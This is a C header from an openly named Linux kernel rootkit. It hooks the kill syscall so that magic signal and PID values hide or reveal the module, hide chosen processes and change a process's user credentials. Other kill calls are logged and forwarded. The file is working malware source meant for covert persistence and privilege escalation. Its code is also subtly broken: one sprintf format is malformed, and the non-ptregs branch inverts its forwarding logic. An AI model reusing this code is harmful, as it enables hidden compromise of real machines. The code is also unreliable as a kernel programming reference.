#ifndef SYS_KILL_H
#define SYS_KILL_H

#include "rootkit.h"

/**
 * Change the visibility of the module if needed
 */
void switch_my_visibility(void)
{
    if (!is_hidden)
        hide_myself();
    else
        show_myself();
}

/* --------------------------------------------------------- */

/**
 * @brief Apply specific command depending on pid and sig given
 *
 */
bool parse_sig_pid(int sig, pid_t pid)
{
    if (sig == SIG_SHOW_MYSELF && pid == (pid_t)SHOW_MYSELF)
    {
        switch_my_visibility();
        return true;
    }
    else if (sig == SIG_HIDE_PROC)
    {
        sprintf(hide_pid, "%d%", pid);
        return true;
    }
    else if (sig == SIG_SET_USER)
    {
        set_user_as(pid);
        return true;
    }
    else
    {
        info("Kill(pid=%d, sig=%d) intercepted\n", pid, sig);
        return false;
    }
}

#if defined(PTREGS_SYSCALL_STUBS)

static asmlinkage long (*orig_kill)(struct pt_regs *regs);

/* ptregs-style syscall stub (x64 >= 4.17) */
static asmlinkage long hook_kill(struct pt_regs *regs)
{
    pid_t pid = ARG1(regs, pid_t);
    int sig = ARG2(regs, int);
    long ret;

    if (!parse_sig_pid(sig, pid))
    {
        if (!orig_kill)
        {
            warn("Original not set\n");
            return -ENOENT;
        }

        /* original takes struct pt_regs* */
        ret = orig_kill(regs);
        return ret;
    }
    return 0;
}

#else

static asmlinkage long (*orig_kill)(pid_t pid, int sig);

/* classic syscall prototype */
static asmlinkage long hook_kill(pid_t pid, int sig)
{
    if (parse_sig_pid(sig, pid))
    {
        if (!orig_kill)
        {
            warn("Original not set\n");
            return -ENOENT;
        }

        return ((asmlinkage long (*)(pid_t, int))orig_kill)(pid, sig);
    }
    return 0;
}

#endif

#endif /* SYS_KILL_H */